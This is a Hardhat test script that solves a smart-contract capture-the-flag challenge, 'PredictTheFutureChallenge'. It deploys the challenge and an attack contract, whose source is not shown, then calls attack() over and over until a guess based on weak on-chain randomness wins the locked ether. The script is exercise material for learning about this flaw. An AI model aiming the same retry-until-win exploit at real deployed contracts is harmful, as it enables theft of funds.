import { expect } from "chai";
import { ethers } from "hardhat";

const { utils, provider } = ethers;

describe("PredictTheFutureChallenge", () => {
  it("Solves the challenge", async () => {
    const challengeFactory = await ethers.getContractFactory("PredictTheFutureChallenge");
    const challengeContract = await challengeFactory.deploy({ value: utils.parseEther("1") });
    await challengeContract.deployed();

    const attackFactory = await ethers.getContractFactory("PredictTheFutureAttack");
    const attackContract = await attackFactory.deploy(challengeContract.address);
    await attackContract.deployed();

    const lockInGuessTx = await attackContract.lockInGuess({ value: utils.parseEther("1") });
    await lockInGuessTx.wait();

    while (!(await challengeContract.isComplete())) {
      try {
        const attackTx = await attackContract.attack();
        await attackTx.wait();
      } catch (err) {
        console.log(err);
      }
      const blockNumber = await provider.getBlockNumber();
      console.log(`Tried block number: ${blockNumber}`);
    }

    expect(await challengeContract.isComplete()).to.be.true;
  });
});
